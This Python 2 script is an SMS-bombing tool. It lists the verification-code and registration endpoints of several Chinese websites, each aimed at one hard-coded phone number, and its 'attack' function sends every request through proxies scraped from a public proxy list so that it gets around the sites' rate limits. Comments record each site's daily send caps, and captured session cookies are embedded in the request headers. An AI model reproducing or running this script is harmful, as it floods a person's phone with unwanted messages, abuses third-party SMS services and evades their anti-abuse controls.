#!/usr/bin/env python
# -*- coding: utf-8 -*-

import urllib
import urllib2
from time import sleep
import sys
from bs4 import BeautifulSoup
from lxml import etree

ua = "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.101 Safari/537.36"
phone = "15951611383"

valid_proxy = set()

# inurl:register
request_data = [
    {
        "url": "http://www.huanrong18.com/pc/ruanjianxiazai20160907/action.php?type=check_telephone&telephone={}".format(
            phone),
        "data": {"telephone": phone, "type": "check_telephone"},
        "headers": {'Accept': 'application/json, text/javascript, */*; q=0.01',
                    'Accept-Encoding': 'gzip, deflate, sdch',
                    'Accept-Language': 'zh-CN,zh;q=0.8',
                    'Connection': 'keep-alive',
                    'Cookie': 'acw_tc=AQAAAE6uSCe7dwkAM1le2quZgrwrmAY6; PHPSESSID=dpa2kma2qif1726s5o6uom4h06; Hm_lvt_937192137aabeba6cef4aac95ba76010=1491362691; Hm_lpvt_937192137aabeba6cef4aac95ba76010=1491362746',
                    'Host': 'www.huanrong18.com',
                    'Referer': 'http://www.huanrong18.com/pc/ruanjianxiazai20160907/',
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.101 Safari/537.36',
                    'X-Requested-With': 'XMLHttpRequest', }
    },

    # {  # {"result":"true","resultMessage":"验证码已发送，请注意查收短信！","resultType":"SUCCESS","token":""}
    #     "url": "http://d.fcyun.com//register/getcode?rand=0.5558077982148903&submit_token=undefined",
    #     "data": {"receiveMobileNo": phone},
    #     "headers": {"User-Agent": ua, "Referer": "http://d.fcyun.com/register?dyzc2"}
    # },
    #
    # {
    #     "url": "http://www.jc258.cn/signup/send_sms",
    #     "data": {"mobile": phone, "type": "register"},
    #     "headers": {"User-Agent": ua, "Referer": "http://www.jc258.cn/signup"}
    # },
    #
    # {  # invalid   340|`pT----false     3!----true
    #     "url": "http://v.gaodun.com/Member/sendmsg",
    #     "data": {"phone": phone, "type": "1"},
    #     "headers": {'Accept': '*/*',
    #                 'Accept-Encoding': 'gzip, deflate',
    #                 'Accept-Language': 'zh-CN,zh;q=0.8',
    #                 'Connection': 'keep-alive',
    #                 'Content-Length': '24',
    #                 'Content-Type': 'application/x-www-form-urlencoded',
    #                 'Host': 'v.gaodun.com',
    #                 'Origin': 'http://v.gaodun.com',
    #                 'Referer': 'http://v.gaodun.com/Member/register/st/w',
    #                 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.101 Safari/537.36',
    #                 'X-Requested-With': 'XMLHttpRequest',
    #                 'Cookie': 'PHPSESSID=o38dl4s1oo6i09cv62qg5c5407; advTraceCookie=%7B%22utm_source%22%3Anull%2C%22utm_medium%22%3Anull%2C%22utm_content%22%3Anull%2C%22utm_term%22%3Anull%2C%22utm_campaign%22%3Anull%2C%22utm_referer%22%3A%22https%3A%5C%2F%5C%2Fwww.baidu.com%5C%2Flink%3Furl%3D0Fr8W1buDFbeTbbkG-D4TKHSloM3NAcOBdWlNK8NR9j_1RZuCR2a2tPWD3LKr8RJ%26amp%3Bwd%3D%26amp%3Beqid%3Dc31af74e000704a100000005571de731%22%2C%22regTime%22%3A1461577581%7D; _gat=1; LXB_REFER=www.baidu.com; /Member/register/st/w20160426=strurl; Hm_lvt_507c379d9d531d894764db006bbda591=1461577619; Hm_lpvt_507c379d9d531d894764db006bbda591=1461650367; Hm_lvt_47c9a9a999d2ce758b60f8bb27a5870f=1461577619,1461639185,1461650359; Hm_lpvt_47c9a9a999d2ce758b60f8bb27a5870f=1461650368; _ga=GA1.2.1826589213.1461577620; InfocookieQ=1461650534783'
    #                 }
    # },
    #
    # {  # {"Msg":true,"Text":"OK10060490"}    {"Error":true,"Text":"超过限制，获得不成功，请隔天再试"}
    #     "url": "http://www.podinns.com/Account/ReSendMobile10?mobile={}".format(phone),
    #     "data": {"mobile": phone},
    #     "headers": {'Host': 'www.podinns.com',
    #                 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:45.0) Gecko/20100101 Firefox/45.0',
    #                 'Accept': '*/*',
    #                 'Accept-Language': 'zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3',
    #                 'Accept-Encoding': 'gzip, deflate',
    #                 'DNT': '1',
    #                 'X-Requested-With': 'XMLHttpRequest',
    #                 'Referer': 'http://www.podinns.com/Account/reg2013',
    #                 'Cookie': 'ASP.NET_SessionId=enbmtdjbvtcruccwcxxaogif',
    #                 'Connection': 'keep-alive',
    #                 'Content-Length': '0'},
    # },
    #
    # {  # 每天验证码只会发送5次    !Ww L(n----true
    #     "url": "https://www.veromoda.com.cn/webapp/wcs/stores/servlet/BSSendMobileCode",
    #     "data": {'storeId': '10151',
    #              'catalogId': '10001',
    #              'langId': '-7',
    #              'mobile': phone,
    #              'params': 'REGISTER'},
    #     "headers": {'Accept': 'application/json, text/javascript, */*; q=0.01',
    #                 'Accept-Encoding': 'gzip, deflate',
    #                 'Accept-Language': 'zh-CN,zh;q=0.8',
    #                 'Connection': 'keep-alive',
    #                 'Content-Length': '74',
    #                 'Content-Type': 'application/x-www-form-urlencoded',
    #                 'Host': 'www.veromoda.com.cn',
    #                 'Origin': 'https://www.veromoda.com.cn',
    #                 'Referer': 'https://www.veromoda.com.cn/webapp/wcs/stores/servlet/UserRegistrationForm?new=Y&catalogId=10001&langId=-7&storeId=10151&registerWay=new',
    #                 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.101 Safari/537.36',
    #                 'X-Requested-With': 'XMLHttpRequest',
    #                 'Cookie': 'JSESSIONID=0000RUBoPv9MRFC1VwsNbwCXXE5:18aol2v3t; REFERRER=https%3a%2f%2fwww%2ebaidu%2ecom%2flink%3furl%3d%2dJPaIdaDtkGeOrq%2dAFZ%5f6%5fHXxgfAsGYRCR9YsHovxdn98KImqfd%5fofHDZO%5f1ZylvL9ltl2ZiLWKVnfW9v3oQya%26wd%3d%26eqid%3df9a70e580005a06300000005571f2c8a; WC_SESSION_ESTABLISHED=true; WC_PERSISTENT=g54p%2fCkGAYNBl%2fb3l7tgpLslTQc%3d%0a%3b2016%2d04%2d26+16%3a53%3a51%2e209%5f1461660831202%2d1290%5f10151; WC_ACTIVEPOINTER=%2d7%2c10151; WC_USERACTIVITY_-1002=%2d1002%2c10151%2cnull%2cnull%2cnull%2cnull%2cnull%2cnull%2cnull%2cnull%2cqDRVbHedtn%2bIlb%2byDjkaHEDKhujNWQlXvJ0S6nhTb0FTYKBF1PFyO4IPPoGGUro4Q7PawVEeQ68P%0aT%2fAWPSFU3UHl%2b10fy%2fCLiTp%2besE1HQAS3plo3E86GL9%2fZrZlOE1MHTUgPZZ1iC4%3d; WC_GENERIC_ACTIVITYDATA=[177411825%3atrue%3afalse%3a0%3adEQrYnBKWtfhqVq8gJSo1GkgHsw%3d][com.ibm.commerce.context.audit.AuditContext|1461660831202%2d1290][com.ibm.commerce.store.facade.server.context.StoreGeoCodeContext|null%26null%26null%26null%26null%26null][CTXSETNAME|Store][com.ibm.commerce.context.globalization.GlobalizationContext|%2d7%26CNY%26%2d7%26CNY][com.ibm.commerce.catalog.businesscontext.CatalogContext|10001%26null%26false%26false%26false][com.ibm.commerce.context.base.BaseContext|10151%26%2d1002%26%2d1002%26%2d1][com.ibm.commerce.context.experiment.ExperimentContext|null][com.ibm.commerce.context.entitlement.EntitlementContext|10003%2610003%26null%26%2d2000%26null%26null%26null][com.ibm.commerce.giftcenter.context.GiftCenterContext|null%26null%26null]; cookiesession1=RIINNBKCED9GV3MA0CUU1O9AOMGDKD05; cmTPSet=Y; CoreID6=67314785945414616608778&ci=90398199; WC_AUTHENTICATION_-1002=%2d1002%2c1j%2fVym5SBrpDD40fejiD%2f%2fWuG%2bs%3d; {}=1461661257986; Hm_lvt_d83ccc61891ad3ca57cc4bfec7d4e1e3=1461660878; Hm_lpvt_d83ccc61891ad3ca57cc4bfec7d4e1e3=1461663169; 90398199_clogin=l=1461660877&v=1&e=1461664980115'.format(
    #                     phone)}
    # },
    #
    # {  # 每天验证码只会发送5次    !Ww L(n----true
    #     "url": "https://www.selected.com.cn/webapp/wcs/stores/servlet/BSSendMobileCode",
    #     "data": {'storeId': '10151',
    #              'catalogId': '10001',
    #              'langId': '-7',
    #              'mobile': phone,
    #              'params': 'REGISTER'},
    #     "headers": {'Accept': 'application/json, text/javascript, */*; q=0.01',
    #                 'Accept-Encoding': 'gzip, deflate',
    #                 'Accept-Language': 'zh-CN,zh;q=0.8',
    #                 'Connection': 'keep-alive',
    #                 'Content-Length': '74',
    #                 'Content-Type': 'application/x-www-form-urlencoded',
    #                 'Host': 'www.selected.com.cn',
    #                 'Origin': 'https://www.selected.com.cn',
    #                 'Referer': 'https://www.selected.com.cn/webapp/wcs/stores/servlet/UserRegistrationForm?new=Y&catalogId=10001&langId=-7&storeId=10151&registerWay=new&flag=N',
    #                 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.101 Safari/537.36',
    #                 'X-Requested-With': 'XMLHttpRequest',
    #                 'Cookie': 'JSESSIONID=00004sFgIPFK7iG4Pdeza8qI_zQ:18aol2v3t; REFERRER=https%3a%2f%2fwww%2ebaidu%2ecom%2flink%3furl%3dayMy2zRIZBPkrY2VXfsgQhTGM%2dpzwJ4%5f6dDG6XYL62tbiCkqBW2Tfzu5e38YSZ%2dhBd82w9DKx2B6Cg33ZykP2q%26wd%3d%26eqid%3dce87a7cb0008164c00000005571f3327; WC_SESSION_ESTABLISHED=true; WC_PERSISTENT=sN2nYVfs6KTWIRvtaxwv8iRZY3I%3d%0a%3b2016%2d04%2d26+17%3a21%3a49%2e291%5f1461662509282%2d72603%5f10151; WC_ACTIVEPOINTER=%2d7%2c10151; WC_USERACTIVITY_-1002=%2d1002%2c10151%2cnull%2cnull%2cnull%2cnull%2cnull%2cnull%2cnull%2cnull%2cqDRVbHedtn%2bIlb%2byDjkaHEDKhujNWQlXvJ0S6nhTb0FTYKBF1PFyO4IPPoGGUro41HNmPVAy58qc%0a5cCbcqQD4qKtJcGYzgV9pYWfOgZTsA%2f9XdyGmyB3wByII%2f%2bFQNd1GnUiBvuqTSo%3d; WC_GENERIC_ACTIVITYDATA=[118865575%3atrue%3afalse%3a0%3adG%2bk8OJRCpfBZSyHMaASu411bfA%3d][com.ibm.commerce.context.audit.AuditContext|1461662509282%2d72603][com.ibm.commerce.store.facade.server.context.StoreGeoCodeContext|null%26null%26null%26null%26null%26null][CTXSETNAME|Store][com.ibm.commerce.context.globalization.GlobalizationContext|%2d7%26CNY%26%2d7%26CNY][com.ibm.commerce.catalog.businesscontext.CatalogContext|10001%26null%26false%26false%26false][com.ibm.commerce.context.base.BaseContext|10151%26%2d1002%26%2d1002%26%2d1][com.ibm.commerce.context.experiment.ExperimentContext|null][com.ibm.commerce.context.entitlement.EntitlementContext|10003%2610003%26null%26%2d2000%26null%26null%26null][com.ibm.commerce.giftcenter.context.GiftCenterContext|null%26null%26null]; cmTPSet=Y; CoreID6=03583138944514616625486&ci=90398212; WC_AUTHENTICATION_-1002=%2d1002%2c1j%2fVym5SBrpDD40fejiD%2f%2fWuG%2bs%3d; Hm_lvt_454621c4e6429501da2aa6df0c2f7f9c=1461662549; Hm_lpvt_454621c4e6429501da2aa6df0c2f7f9c=1461662553; 90398212_clogin=l=1461662548&v=1&e=1461664370055'
    #                 }
    # },
    #
    {
        "url": "http://www.aipai.com/app/www/apps/ums.php?step=ums&mobile={}".format(phone),
        "data": {"receiveMobileNo": phone},
        "headers": {"User-Agent": ua, "Referer": "http://www.aipai.com/signup.php?_t_t_t=0.3551206151023507"}
    },
]


def attack(para, proxy):
    global valid_proxy
    data = para["data"]
    if data:
        data = urllib.urlencode(data)

    if proxy:
        proxies = {'http': 'http://{0}:{1}'.format(*proxy)}
        handler = urllib2.ProxyHandler(proxies)
        opener = urllib2.build_opener(handler)
        urllib2.install_opener(opener)

    try:
        request = urllib2.Request(para["url"], data, para["headers"])
        response = urllib2.urlopen(request, timeout=2)
        ret = response.read()
        # print ret
        print "attack success!!!  proxy: ", proxy
        valid_proxy.add(proxy)
    except Exception, e:
        print "attack failed!!!"


def get_proxy(pages=100):
    ipadds = []

    def get_ip_add(data):
        soup = BeautifulSoup(data, "lxml")
        trs = soup.find_all('tr', {'class': 'odd'}) + soup.find_all('tr', {'class': ''})
        all_text = []
        for tr in trs:
            tds = tr.find_all('td')
            texts = []
            for td in tds:
                text = td.get_text()
                texts.append(text)
            all_text.append(texts)

        for t in all_text:
            if t:
                ipadds.append([t[1], t[2]])

    def get_ip_add_ex(data):
        root = etree.HTML(data)
        for tr in root.xpath("//tr[@class]"):
            tr = tr.xpath("td/text()")
            if len(tr) > 2:
                yield ([tr[0], tr[1]])

    for page in range(1, pages + 1):
        request = urllib2.Request("http://www.xicidaili.com/nn/{}".format(str(page)), headers={"User-Agent": ua})
        response = urllib2.urlopen(request)
        data = response.read()
        # get_ip_add(data)

        root = etree.HTML(data)
        for tr in root.xpath("//tr[@class]"):
            tr = tr.xpath("td/text()")
            if len(tr) > 2:
                yield ([tr[0], tr[1]])

                # return ipadds


if __name__ == "__main__":
    # proxy_info = get_proxy()
    # print proxy_info
    # proxy_info = [
    #     [u'61.232.254.39', u'3128'], [u'222.75.59.10', u'808'],
    #     [u'119.135.187.42', u'80'], [u'218.29.182.89', u'808'], [u'119.188.94.145', u'80'], [u'125.71.243.20', u'8888'],
    #     [u'119.188.94.145', u'80'], [u'112.124.113.155', u'80'], [u'114.234.213.201', u'8118'],
    #     [u'60.29.59.210', u'80'], [u'122.141.74.114', u'3128']]
    for i in range(1):
        for proxy in get_proxy():
            for para in request_data:
                attack(para, proxy)
    # # break
    print list(valid_proxy)
